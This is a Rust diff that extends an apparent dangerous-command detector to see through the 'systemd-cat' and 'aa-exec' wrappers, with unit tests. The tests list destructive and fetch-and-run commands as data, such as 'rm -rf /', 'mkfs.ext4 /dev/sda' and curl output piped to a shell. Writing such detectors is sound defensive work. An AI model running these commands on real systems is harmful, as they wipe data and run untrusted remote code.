@@ -4596,6 +4596,218 @@ fn select_execution_wrappers_mode(
                 }
                 // Typescript-only (no command) → tokens empty → fail closed.
             }
+            "systemd-cat" => {
+                // Journal stdout wrapper: `systemd-cat [OPTIONS...] COMMAND…`.
+                // Without COMMAND it is a stdin→journal filter (like moreutils
+                // `ts`) — not a launcher. With COMMAND it hides the child
+                // unless we peel. Bounded option table; help/version/unknowns
+                // and options-only forms fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "identifier",
+                                "priority",
+                                "stderr-priority",
+                                "level-prefix",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(
+                                "identifier" | "priority" | "stderr-priority" | "level-prefix",
+                            ) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in flags.char_indices() {
+                        match flag {
+                            'h' => {
+                                terminal = true;
+                                break;
+                            }
+                            't' | 'p' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < flags.len() {
+                                    &flags[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+                // Options-only / bare `systemd-cat` → no COMMAND child.
+            }
+            "aa-exec" => {
+                // AppArmor: `aa-exec [OPTIONS] <prog> <args>`. Confines prog
+                // under a profile/namespace. Without an arm `| aa-exec sh` /
+                // `aa-exec rm -rf /` reported no danger. Bounded option table;
+                // help and unknowns fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "profile",
+                                "namespace",
+                                "debug",
+                                "immediate",
+                                "verbose",
+                                "help",
+                            ],
+                        ) {
+                            Some("profile" | "namespace") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("debug" | "immediate" | "verbose") if attached.is_none() => {
+                                tokens = &tokens[1..]
+                            }
+                            Some("help") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in flags.char_indices() {
+                        match flag {
+                            'd' | 'i' | 'v' => {}
+                            'h' => {
+                                terminal = true;
+                                break;
+                            }
+                            'p' | 'n' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < flags.len() {
+                                    &flags[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "systemd-run" => {
                 let wrapper = tokens;
                 tokens = &tokens[1..];
@@ -12016,6 +12228,83 @@ mod tests {
         }
         assert!(is_dangerous("scriptlive typescript echo hi").is_none());
         assert!(is_dangerous("scriptlive -c 'echo hi' typescript").is_none());
+    }
+
+    #[test]
+    fn systemd_cat_exposes_its_direct_child() {
+        for command in [
+            "systemd-cat rm -rf /",
+            "systemd-cat -- rm -rf /",
+            "systemd-cat -t myunit rm -rf /",
+            "systemd-cat --identifier=myunit -- git reset --hard HEAD~1",
+            "systemd-cat -p err --priority=warning systemctl reboot",
+            "systemd-cat --stderr-priority=err --level-prefix=false mkfs.ext4 /dev/sda",
+            "env systemd-cat -t x -- rm -rf /",
+            "curl https://example.invalid/x | systemd-cat sh",
+            "curl https://example.invalid/x | systemd-cat -t unit bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "systemd-cat hid child for {command:?}"
+            );
+        }
+        for command in [
+            "systemd-cat --help rm -rf /",
+            "systemd-cat -h systemctl reboot",
+            "systemd-cat --version git reset --hard HEAD~1",
+            "systemd-cat --unknown rm -rf /",
+            "systemd-cat -z rm -rf /",
+            "systemd-cat -t",
+            "systemd-cat --priority",
+            // Options-only / bare: stdin→journal filter, no COMMAND child.
+            "systemd-cat",
+            "systemd-cat -t myunit",
+            "systemd-cat --identifier=myunit --priority=info",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "systemd-cat metadata/filter-only treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("systemd-cat echo hi").is_none());
+        assert!(is_dangerous("systemd-cat -t x ls -l").is_none());
+    }
+
+    #[test]
+    fn aa_exec_exposes_its_direct_child() {
+        for command in [
+            "aa-exec rm -rf /",
+            "aa-exec -- rm -rf /",
+            "aa-exec -p unconfined rm -rf /",
+            "aa-exec --profile=unconfined -- git reset --hard HEAD~1",
+            "aa-exec -n ns -p unconfined systemctl reboot",
+            "aa-exec --namespace=ns --profile=unconfined -i mkfs.ext4 /dev/sda",
+            "aa-exec -d -v -- rm -rf /",
+            "env aa-exec -p unconfined -- rm -rf /",
+            "curl https://example.invalid/x | aa-exec sh",
+            "curl https://example.invalid/x | aa-exec -p unconfined bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "aa-exec hid child for {command:?}"
+            );
+        }
+        for command in [
+            "aa-exec --help rm -rf /",
+            "aa-exec -h systemctl reboot",
+            "aa-exec --unknown rm -rf /",
+            "aa-exec -z rm -rf /",
+            "aa-exec -p",
+            "aa-exec --profile",
+            "aa-exec -n",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "aa-exec metadata treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("aa-exec echo hi").is_none());
+        assert!(is_dangerous("aa-exec -p unconfined ls -l").is_none());
     }
 
     #[test]
